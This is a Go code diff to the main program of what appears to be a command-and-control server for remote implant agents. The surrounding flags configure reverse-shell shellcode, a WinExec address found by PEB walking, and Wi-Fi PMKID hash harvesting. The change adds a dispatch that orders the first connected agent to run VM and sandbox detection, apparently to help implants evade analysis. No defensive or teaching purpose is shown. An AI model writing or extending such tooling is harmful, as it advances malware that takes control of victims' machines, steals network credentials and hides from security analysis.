@@ -175,6 +175,7 @@ func main() {
 	scPort := flag.Uint("shellcode-port", 4444, "reverse shell target port")
 	scWinExec := flag.Uint64("shellcode-winexec", 0, "windows_x64 WinExec address (from PEB walk)")
 	hostInfo := flag.Bool("hostinfo", false, "ask the first agent for its local interface picture")
+	vmDetect := flag.Bool("vmdetect", false, "ask the first agent to run VM/sandbox detection")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -576,6 +577,11 @@ func main() {
 	// hostinfo dispatch — one-shot local recon on the first agent
 	if *hostInfo {
 		go runHostInfoDispatch(mgr)
+	}
+
+	// vmdetect dispatch — one-shot VM/sandbox check on the first agent
+	if *vmDetect {
+		go runVMDetectDispatch(mgr)
 	}
 
 	if *dnsBind != "" {
@@ -1483,5 +1489,18 @@ func runHostInfoDispatch(mgr *session.Manager) {
 	log.Printf("[hostinfo] -> %s", s.AgentID)
 	if err := s.SendHostInfoStart(sessionID, proto.HostInfoStart{SessionID: sessionID}); err != nil {
 		log.Printf("[hostinfo] start: %v", err)
+	}
+}
+
+// runVMDetectDispatch waits for the first agent, sends a VMDetectStart.
+func runVMDetectDispatch(mgr *session.Manager) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("vm-%d", time.Now().UnixNano())
+	log.Printf("[vmdetect] -> %s", s.AgentID)
+	if err := s.SendVMDetectStart(sessionID, proto.VMDetectStart{SessionID: sessionID}); err != nil {
+		log.Printf("[vmdetect] start: %v", err)
 	}
 }
